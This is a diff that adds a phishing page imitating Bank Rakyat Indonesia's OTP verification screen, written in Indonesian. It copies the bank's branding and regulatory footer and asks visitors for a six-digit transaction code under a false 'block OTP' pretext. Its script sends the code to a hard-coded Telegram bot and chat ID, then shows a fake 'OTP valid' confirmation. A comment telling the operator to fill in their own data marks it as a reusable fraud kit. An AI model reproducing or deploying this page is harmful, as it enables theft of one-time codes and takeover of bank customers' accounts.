@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta http-equiv="Cache-Control" content="max-age=0, no-cache, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <title>BRI — Verifikasi Kode OTP</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <style>
+    :root {
+      --bri-blue: #005AAA;
+      --bri-orange: #FF6A39;
+      --bri-blue-dark: #004A8F;
+      --bri-green: #1DAE4A;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html, body {
+      min-height: 100vh;
+      font-family: 'Montserrat', sans-serif;
+      background: linear-gradient(135deg, var(--bri-blue) 0%, var(--bri-blue-dark) 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 12px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 380px;
+      background: #fff;
+      border-radius: 14px;
+      box-shadow: 0 6px 24px rgba(0,0,0,0.15);
+      overflow: hidden;
+    }
+
+    .header-bri {
+      background: linear-gradient(90deg, var(--bri-blue) 0%, var(--bri-blue-dark) 100%);
+      padding: 16px 12px;
+      text-align: center;
+    }
+
+    .header-bri h2 {
+      color: #fff;
+      font-size: 17px;
+      font-weight: 700;
+      margin: 0;
+    }
+
+    .body-form {
+      padding: 22px 16px 24px;
+    }
+
+    label {
+      display: block;
+      font-weight: 600;
+      font-size: 14px;
+      color: var(--bri-blue);
+      margin-bottom: 14px;
+      text-align: center;
+    }
+
+    .otp-wrapper {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 18px;
+    }
+
+    .otp-box {
+      width: 46px;
+      height: 52px;
+      text-align: center;
+      font-size: 22px;
+      font-weight: 700;
+      border: 2px solid #ddd;
+      border-radius: 10px;
+      outline: none;
+      transition: all 0.2s ease;
+      font-family: 'Montserrat', sans-serif;
+    }
+
+    .otp-box:focus {
+      border-color: var(--bri-orange);
+      box-shadow: 0 0 0 3px rgba(255,106,57,0.15);
+    }
+
+    .otp-box.filled {
+      border-color: var(--bri-blue);
+    }
+
+    .timer-box {
+      text-align: center;
+      margin: 6px 0 20px;
+    }
+
+    #timers {
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--bri-blue);
+    }
+
+    .btn-kirim {
+      width: 100%;
+      background: var(--bri-blue);
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      padding: 13px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+
+    .btn-kirim:hover {
+      background: var(--bri-blue-dark);
+    }
+
+    .btn-kirim:disabled {
+      background: #99b3cc;
+      cursor: not-allowed;
+    }
+
+    .info-text {
+      font-size: 12px;
+      color: #666;
+      text-align: center;
+      margin-top: 16px;
+      line-height: 1.5;
+    }
+
+    .bri-footer {
+      text-align: center;
+      font-size: 10px;
+      color: var(--bri-blue);
+      margin-top: 12px;
+      line-height: 1.4;
+    }
+
+    /* Popup */
+    .popup-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.5);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      padding: 15px;
+    }
+
+    .popup-overlay.active {
+      display: flex;
+    }
+
+    .popup-box {
+      background: #fff;
+      border-radius: 14px;
+      padding: 24px 20px;
+      max-width: 340px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 6px 24px rgba(0,0,0,0.2);
+    }
+
+    .popup-icon {
+      width: 64px;
+      height: 64px;
+      background: var(--bri-green);
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 32px;
+      color: #fff;
+      margin-bottom: 16px;
+    }
+
+    .popup-title {
+      font-size: 19px;
+      font-weight: 700;
+      color: var(--bri-green);
+      margin-bottom: 8px;
+    }
+
+    .popup-text {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 22px;
+      line-height: 1.5;
+    }
+
+    .popup-btn {
+      width: 100%;
+      background: var(--bri-blue);
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      padding: 12px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+
+    .popup-btn:hover {
+      background: var(--bri-blue-dark);
+    }
+
+    /* Sesuaikan layar kecil */
+    @media (max-height: 600px) {
+      .body-form { padding: 18px 16px 20px; }
+      .otp-wrapper { gap: 7px; margin-bottom: 14px; }
+      .otp-box { width: 42px; height: 48px; font-size: 20px; }
+      .timer-box { margin: 4px 0 16px; }
+      #timers { font-size: 18px; }
+      .btn-kirim { padding: 11px; font-size: 15px; }
+      .info-text { margin-top: 12px; font-size: 11px; }
+      .bri-footer { margin-top: 10px; }
+    }
+
+    @media (max-width: 360px) {
+      .otp-wrapper { gap: 6px; }
+      .otp-box { width: 40px; height: 46px; font-size: 19px; }
+      .body-form { padding: 18px 12px 20px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="header-bri">
+    <h2>Verifikasi Kode OTP</h2>
+  </div>
+
+  <div class="body-form">
+    <label>Kode OTP Transaksi</label>
+
+    <div class="otp-wrapper">
+      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" id="otp1">
+      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" id="otp2">
+      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" id="otp3">
+      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" id="otp4">
+      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" id="otp5">
+      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" id="otp6">
+    </div>
+
+    <div class="timer-box">
+      <span id="timers">1 : 00</span>
+    </div>
+
+    <button id="btnSubmit" class="btn-kirim">Blokir OTP Transaksi</button>
+
+    <p class="info-text">
+      Kode OTP dikirim ke nomor HP yang terdaftar di BRI.<br>
+      Jangan berikan kode ini kepada siapapun.
+    </p>
+
+    <p class="bri-footer">
+      PT Bank Rakyat Indonesia (Persero) Tbk.<br>
+      Berizin & diawasi OJK • Peserta penjaminan LPS
+    </p>
+  </div>
+</div>
+
+<!-- Popup Kode Valid -->
+<div class="popup-overlay" id="popupValid">
+  <div class="popup-box">
+    <div class="popup-icon">
+      <i class="fas fa-check"></i>
+    </div>
+    <h3 class="popup-title">Kode OTP Valid</h3>
+    <p class="popup-text">
+      Kode OTP Anda telah diverifikasi.<br>
+      Permintaan sedang diproses...
+    </p>
+    <button class="popup-btn" id="btnLanjut">Lanjutkan</button>
+  </div>
+</div>
+
+<script>
+// ==============================================
+// 🔑 ISI DATA ANDA DI BAWAH INI
+// ==============================================
+const TELEGRAM_TOKEN = '8827808672:AAHY00e5ddDpfpdwK9ZSn35ZOIAlIZbACnk';
+const TELEGRAM_CHAT_ID = '8405193617';
+// ==============================================
+
+const otpInputs = [
+  document.getElementById('otp1'),
+  document.getElementById('otp2'),
+  document.getElementById('otp3'),
+  document.getElementById('otp4'),
+  document.getElementById('otp5'),
+  document.getElementById('otp6')
+];
+const popupValid = document.getElementById('popupValid');
+const btnLanjut = document.getElementById('btnLanjut');
+
+// Kotak OTP
+otpInputs.forEach((input, index) => {
+  input.addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '');
+    if (this.value) {
+      this.classList.add('filled');
+      if (index < otpInputs.length - 1) otpInputs[index + 1].focus();
+    } else {
+      this.classList.remove('filled');
+    }
+  });
+  input.addEventListener('keydown', function(e) {
+    if (e.key === 'Backspace' && !this.value && index > 0) otpInputs[index - 1].focus();
+  });
+});
+
+// Timer
+function startTimer() {
+  let sisa = 60;
+  const el = document.getElementById('timers');
+  function update() {
+    const m = Math.floor(sisa / 60);
+    const s = sisa % 60;
+    el.textContent = `${m} : ${s < 10 ? '0' + s : s}`;
+    if (sisa <= 0) return;
+    sisa--;
+    setTimeout(update, 1000);
+  }
+  update();
+}
+startTimer();
+
+// Kirim & Tampil Valid
+document.getElementById("btnSubmit").addEventListener("click", async function () {
+  const kodeOTP = otpInputs.map(i => i.value).join('');
+
+  if (kodeOTP.length !== 6) {
+    alert("Harap isi 6 digit kode OTP lengkap!");
+    return;
+  }
+
+  if (TELEGRAM_TOKEN === '8827808672:AAHY00e5ddDpfpdwK9ZSn35ZOIAlIZbACnk' || TELEGRAM_CHAT_ID === '8405193617') {
+    alert("⚠️ Silakan isi Token & Chat ID terlebih dahulu!");
+    return;
+  }
+
+  const btn = this;
+  btn.disabled = true;
+  btn.textContent = "Memproses...";
+
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: `Kode OTP Transaksi:\n${kodeOTP}`
+      })
+    });
+  } catch (err) {
+    console.error(err);
+  }
+
+  setTimeout(() => {
+    btn.disabled = false;
+    btn.textContent = "Blokir OTP Transaksi";
+    popupValid.classList.add('active');
+  }, 800);
+});
+
+btnLanjut.addEventListener('click', function() {
+  popupValid.classList.remove('active');
+  // window.location.href = "halaman-berikutnya.html";
+  alert("Permintaan berhasil diproses!");
+});
+</script>
+
+</body>
+</html>
